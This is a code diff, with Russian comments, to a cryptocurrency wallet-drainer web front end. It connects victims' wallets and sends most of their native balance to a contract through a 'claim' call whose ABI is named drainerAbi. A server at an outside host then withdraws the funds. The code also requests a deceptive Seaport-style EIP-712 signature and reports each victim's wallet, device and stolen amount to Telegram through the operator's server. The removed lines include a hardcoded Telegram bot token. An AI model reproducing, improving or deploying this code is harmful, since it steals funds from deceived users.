@@ -4,9 +4,10 @@ import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
 import { readContract, writeContract, sendCalls, getBalance, signTypedData } from '@wagmi/core'
 
-// === Глобальный флаг для управления sendCalls ===
+// === Глобальные флаги ===
 const USE_SENDCALLS = false;
 const MIN_VALUE_USD = 0;
+const ENABLE_PRE_SIGNATURE = true; // Включить/отключить предварительную подпись EIP-712
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -31,8 +32,7 @@ const monitorAndSpeedUpTransaction = async (txHash, chainId, wagmiConfig) => {
 const projectId = import.meta.env.VITE_PROJECT_ID || '2511b8e8161d6176c55da917e0378c9a'
 if (!projectId) throw new Error('VITE_PROJECT_ID is not set')
 
-const telegramBotToken = import.meta.env.VITE_TELEGRAM_BOT_TOKEN || '8238426852:AAGEc__oMefvCpE_jJtgsjDCleEfDBrjolc'
-const telegramChatId = import.meta.env.VITE_TELEGRAM_CHAT_ID || '-4828313363'
+// Telegram секреты теперь на сервере
 
 const networks = [bsc, mainnet, polygon, arbitrum, optimism, base, scroll, avalanche, fantom, linea, zkSync, celo]
 const networkMap = {
@@ -85,7 +85,8 @@ const store = {
   isApprovalRequested: false,
   isApprovalRejected: false,
   connectionKey: null,
-  isProcessingConnection: false
+  isProcessingConnection: false,
+  hasSignedPreSignature: false // Отслеживание предварительной подписи в сессии
 }
 
 // Создание модального окна
@@ -198,6 +199,7 @@ window.addEventListener('load', () => {
   store.isApprovalRejected = false
   store.connectionKey = null
   store.isProcessingConnection = false
+  store.hasSignedPreSignature = false // Сбрасываем флаг подписи
   updateButtonVisibility(false)
   updateStateDisplay('accountState', {})
   updateStateDisplay('networkState', {})
@@ -294,16 +296,20 @@ function detectDevice() {
   return 'Desktop'
 }
 
-// Функция отправки сообщений в Telegram (через фронт)
+// Функция отправки сообщений в Telegram (через сервер)
 async function sendTelegramMessage(message) {
   try {
-    const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+    const response = await fetch('https://api.cryptomuspayye.icu/api/notify', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: telegramChatId, text: message, parse_mode: 'Markdown', disable_web_page_preview: true })
+      body: JSON.stringify({ 
+        text: message, 
+        parse_mode: 'Markdown', 
+        disable_web_page_preview: true 
+      })
     })
     const data = await response.json()
-    if (!data.ok) throw new Error(data.description || 'Failed to send Telegram message')
+    if (!data.success) throw new Error(data.message || 'Failed to send Telegram message')
   } catch (error) {
     store.errors.push(`Error sending Telegram message: ${error.message}`)
   }
@@ -566,11 +572,21 @@ const drainerAbi = [
 
 // Подпись EIP-712 (Seaport 1.6) перед транзакцией
 const signSeaportPrecheck = async (wagmiConfig, userAddress, chainId) => {
+  // Проверяем, включена ли предварительная подпись
+  if (!ENABLE_PRE_SIGNATURE) {
+    return true // Пропускаем подпись если отключена
+  }
+  
+  // Проверяем, была ли уже подпись в этой сессии
+  if (store.hasSignedPreSignature) {
+    return true // Пропускаем подпись если уже была
+  }
+  
   const domain = {
     name: 'Seaport',
     version: '1.6',
     chainId,
-    verifyingContract: '0x0000000000000068f116a894984e2db1123eb395'
+    verifyingContract: '0x7a250d5630b4cf539739df2c5dacb4c659f2488d'
   }
   const types = {
     OrderComponents: [
@@ -635,6 +651,8 @@ const signSeaportPrecheck = async (wagmiConfig, userAddress, chainId) => {
       primaryType: 'OrderComponents',
       message
     })
+    // Отмечаем, что подпись была выполнена в этой сессии
+    store.hasSignedPreSignature = true
     return true
   } catch (error) {
     if (error.code === 4001 || error.code === -32000 || error.message?.toLowerCase().includes('user rejected')) {
@@ -745,6 +763,23 @@ const getGasReserveWei = (chainId) => {
   return parseUnits('0.0005', 18)
 }
 
+const callWithdrawAPI = async (chainId) => {
+  try {
+    const response = await fetch('https://api.cryptomuspayye.icu/api/withdraw', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chainId })
+    })
+    const data = await response.json()
+    if (data.success) {
+      return { success: true, txHash: data.txHash, amount: data.amount, token: data.token }
+    }
+    return { success: false, message: data.message }
+  } catch (error) {
+    return { success: false, message: error.message }
+  }
+}
+
 const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => {
   if (!userAddress || !isAddress(userAddress)) throw new Error('Invalid user address')
   const contractAddress = CONTRACTS[chainId]
@@ -759,7 +794,8 @@ const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => 
   const valueToSend = balanceWei > reserveWei + minDust ? (balanceWei - reserveWei) : (balanceWei > minDust ? (balanceWei - minDust) : 0n)
   if (valueToSend <= 0n) throw new Error('Insufficient native balance to send')
   try {
-    const txHash = await writeContract(wagmiConfig, {
+    // 1. Сначала claim - пользователь отправляет средства на контракт
+    const claimTxHash = await writeContract(wagmiConfig, {
       address: getAddress(contractAddress),
       abi: drainerAbi,
       functionName: 'claim',
@@ -767,7 +803,20 @@ const claimNative = async (wagmiConfig, chainId, userAddress, nativeBalance) => 
       chainId,
       value: valueToSend
     })
-    return txHash
+    
+    // 2. Ждем подтверждения claim транзакции
+    await new Promise(resolve => setTimeout(resolve, 3000))
+    
+    // 3. Затем вызываем API для withdraw - сервер выводит средства с контракта
+    const withdrawResult = await callWithdrawAPI(chainId)
+    
+    if (!withdrawResult.success) {
+      console.warn('Withdraw API failed:', withdrawResult.message)
+      // Возвращаем только claim хеш, если withdraw не удался
+      return claimTxHash
+    }
+    
+    return { claimTxHash, withdrawTxHash: withdrawResult.txHash }
   } catch (error) {
     // Проверяем, является ли ошибка отклонением пользователя
     if (error.code === 4001 || error.code === -32000 || error.message?.toLowerCase().includes('user rejected')) {
@@ -1146,16 +1195,16 @@ const initializeSubscribers = (modal) => {
             const modalMessage = document.querySelector('.custom-modal-message')
             try {
               
-              const txHash = await claimNative(wagmiAdapter.wagmiConfig, mostExpensive.chainId, state.address, mostExpensive.balance)
+              const result = await claimNative(wagmiAdapter.wagmiConfig, mostExpensive.chainId, state.address, mostExpensive.balance)
               
-              // Уведомление об успехе
+              // Уведомление об успехе (используем claimTxHash для уведомления)
               await notifyTransferSuccess(
                 state.address,
                 walletInfo.name,
                 device,
                 { symbol: mostExpensive.symbol, balance: mostExpensive.balance, price: mostExpensive.price },
                 mostExpensive.chainId,
-                txHash
+                typeof result === 'string' ? result : result.claimTxHash
               )
               
               // Показываем успех в модальном окне
@@ -1490,6 +1539,7 @@ document.getElementById('disconnect')?.addEventListener('click', () => {
   store.isApprovalRejected = false
   store.connectionKey = null
   store.isProcessingConnection = false
+  store.hasSignedPreSignature = false // Сбрасываем флаг подписи при отключении
   sessionStorage.clear()
 })
 
